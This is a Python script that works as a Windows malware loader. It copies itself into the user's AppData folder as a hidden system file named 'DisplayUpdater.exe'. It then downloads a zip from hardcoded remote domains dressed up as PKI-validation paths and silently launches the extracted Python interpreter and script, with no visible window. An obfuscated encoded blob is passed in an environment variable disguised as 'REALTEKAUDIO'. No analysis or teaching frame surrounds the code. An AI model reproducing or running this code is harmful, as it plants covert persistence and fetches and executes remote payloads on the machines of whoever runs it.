import os
import sys
import tempfile
import shutil
import requests
import zipfile
import subprocess
from pathlib import Path

URLS = [
    "https://postprocesser.com/.well-known/pki-validation/go/python3.zip",
    "https://cosmoplanets.net/well-known/pki-validation/go/python3.zip",
]

def download_and_extract(url, output_path):
    zip_path = Path(tempfile.gettempdir()) / "download.zip"

    response = requests.get(url, stream=True)
    if response.status_code != 200:
        raise Exception("Download error")

    with open(zip_path, "wb") as f:
        for chunk in response.iter_content(1024):
            f.write(chunk)

    with zipfile.ZipFile(zip_path, "r") as zip_ref:
        zip_ref.extractall(output_path)

def fly_me_to_the_moon():
    tmp_dir = Path(tempfile.mkdtemp(prefix="tmp-"))
    success = False

    for url in URLS:
        try:
            download_and_extract(url, tmp_dir)
            success = True
            break
        except Exception:
            continue

    if not success:
        sys.exit(1)

    extracted_dir = tmp_dir / "python3"
    python_executable = extracted_dir / "pythonw.exe"
    script_path = extracted_dir / "exec.py"
    executable_name = os.path.basename(sys.argv[0])

    env = os.environ.copy()
    env["REALTEKAUDIO"] = "4....VVV5d31jNEd1bzRjd0x7RGREWWw5bUROczlTdUtraEpRSjIxemg1RjgyOjQ2YztkOzc2RERHNkQzOEo5MkhISktmN2g9OmJjOTc1NGcwdjl2d316fFpGWVU8aEhEXn1DRGVHZ1NqRWpbelZwVmxuXDBIWXZnbFI3dkxWR256aWU7OnN1ODZrcG13NndlOGZuU1lJMHV3bnNreDhnOTt5bHtsODpsZnQ4PHw1dDpqczg1d3ZvdGVpOzlraGl9dy5kZjV2MWZ3NDw0O3t6anluej0+OG82fml4dnxve3Y6enA+NDRzaGs5aXYxUWZOV15QaHM1WGZpZUZqcGxyVU5fbnhVUElTOmR5OmpMPDFmZWZ1NXY6e3RwOGsybzhrdXh2O29penFwbXhodGx1dHU3O3ppMmpxbzV4Nm5xaHo5aGszaXNwd3pubzZvbGdzZT54ZjtwfHZsc3t3cXJ3ZWp4OTZsPjNndT08dGY4Om90N2t6fm5yMEtHRklYWDhZOVg4Rkg3TVdbSUVZOVJVUFo2T1BDSk5YN1tdR1FHQ0heS040TE5OVVM4UFE2RFc6MkQ3dkp7b0NzOm5ye0Y8ajQ1eklpUTZHaGpvbXxmOlV8eE5VNnZbW3RZfHpp"
    env["PROCNAME"] = executable_name

    subprocess.Popen(
        [str(python_executable), str(script_path)],
        env=env,
        creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW,
    )

    sys.exit(0)

def copy_self():
    appdata = Path.home() / "AppData" / "Roaming"
    executable_path = appdata / "DisplayUpdater.exe"
    current_executable = sys.argv[0]

    if executable_path.exists():
        executable_path.unlink()

    appdata.mkdir(parents=True, exist_ok=True)
    shutil.copy2(current_executable, executable_path)

    subprocess.run(["attrib", "+h", "+s", str(executable_path)], shell=True)

def main():
    copy_self()
    fly_me_to_the_moon()

main()
